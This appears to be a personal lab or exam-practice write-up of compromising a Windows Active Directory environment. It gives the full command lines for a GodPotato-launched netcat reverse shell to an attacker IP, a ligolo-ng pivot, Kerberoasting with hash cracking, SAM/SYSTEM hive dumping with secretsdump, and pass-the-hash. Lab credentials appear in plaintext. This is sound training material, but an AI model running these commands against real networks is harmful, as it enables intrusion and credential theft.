# Active Directory

I start off with the credentials:

```
Eric.Wallows / EricLikesRunning800
```

I start by enumerating for SMB shares:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

We quickly see that we can connect through evil-winrm and that the user eric.wallows has SeImpersonatePrivilege

<figure><img src="../../../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070" %}

So i upload printspoofer to the box:

<figure><img src="../../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

But there is a problem with a persistent shell because evil winrm is not interactive, so i go on another method, download and upload godpotato and launch this command:

```
C:/Users/eric.wallows/Desktop/GodPotato-NET4.exe -cmd "C:/Users/eric.wallows/Desktop/nc.exe -e cmd.exe 192.168.45.157 1234"
```

and i get a reverse shell:

<figure><img src="../../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

Ok so whil looking at the IP config, we see that this machine is dual homed:

<figure><img src="../../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

So i need to be able to pivot to access the services on the other subnet, i'll  use ligolo:

```
git clone https://github.com/nicocha30/ligolo-ng.git
cd ligolo-ng
go build -o agent ./cmd/agent
go build -o proxy ./cmd/proxy
```

From my linux box i can send to target 2 ways, with or without winrm:

without:

```
scp agent.exe user@windows-target:C:\Users\Public\agent.exe
```

with:

```
Invoke-WebRequest -Uri "http://YOUR_IP/agent.exe" -OutFile "C:\Users\Public\agent.exe"
```

<figure><img src="../../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

I got some problems with:

```sh
[Feb 21, 2025 - 20:41:38 (CET)] exegol-Offsec ligolo-ng # ./proxy -laddr 0.0.0.0:11601

ERRO[0000] Could not load TLS certificate. Please make sure paths are correct or use -autocert or -selfcert options  certfile=certs/cert.pem keyfile=certs/key.pem
FATA[0000] open certs/cert.pem: no such file or directory
```

and fixed it with:

```
./proxy -laddr 0.0.0.0:11601 -selfcert
```

ok i gave up on chisel and came back on ligolo, after downloading ligolo agent for windows and proxy for linux, on my kali box i ran&#x20;

```
tar -xvzf ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
ip tuntap add user felix mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

and on my windows session i ran:

```
./agent.exe --connect 192.168.45.238:11601 -ignore-cert
```

<figure><img src="../../../../.gitbook/assets/image (206).png" alt=""><figcaption></figcaption></figure>

Then in another terminal i type:

```
sudo ip route add 10.10.87.0/24 dev ligolo
```

and i go back in the kali ligolo shell and type:

```
session
1
start
```

And i can now ping the internal network:&#x20;

<figure><img src="../../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

Then i start my enumeration over again and look for open ports:

<figure><img src="../../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>

then i look for open shares:

<figure><img src="../../../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

I go and download everything in Users share and find a lot of stuff:

<figure><img src="../../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

I started looking through each file but it was very long so i told myself that i'll continue enumeration and found something:

```
nxc ldap 10.10.87.140 -u Eric.Wallows -p EricLikesRunning800 --kerberoasting kerb.out
```

<figure><img src="../../../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

and we're able to crack the password of web\_svc with command:

```
hashcat -m13100 websvc.hash /usr/share/wordlists/rockyou.txt
```

And we confirm we have the good credentials:

<figure><img src="../../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

Then i went back and privesc to dump hashes:

```
reg save HKLM\SAM "C:\Windows\Temp\sam.save"
reg save HKLM\SECURITY "C:\Windows\Temp\security.save"
reg save HKLM\SYSTEM "C:\Windows\Temp\system.save"
```

was able to secretsdump&#x20;

```
impacket-secretsdump -sam 'sam.save' -security 'security.save' -system 'system.save' LOCAL 
```

<figure><img src="../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

With the default creds i can connect to celia.almeda: via evil winrm

Then i find a windows.old folder that contains in /windows/system32 a sam and system hive that i export back to my attackbox and crack:

```
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I'm able to use pass the hash to connect as tom admin:

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And get the proof.txt on the admin Desktop
